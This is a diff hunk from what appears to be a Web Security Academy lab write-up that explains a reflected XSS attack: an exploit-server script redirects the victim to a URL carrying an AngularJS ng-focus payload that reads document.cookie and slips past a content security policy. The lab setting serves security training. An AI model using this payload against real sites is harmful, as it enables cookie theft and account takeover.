@@ -6,7 +6,7 @@
 2. Because the vulnerability was a Reflected XSS, executing it required an external delivery mechanism. I utilized the lab's **Exploit Server** to host a malicious delivery script that forces the victim's browser to redirect to the vulnerable parameter:
    ```html
    <script>
-   location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+   location='https://MY-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
    </script>
    ```
 3. **Bypassing the CSP:** The implemented CSP blocked classical `<script>` injections. However, it failed to restrict client-side templates. I injected a raw HTML `<input>` tag carrying dynamic AngularJS attributes, completely blinding the CSP filter.
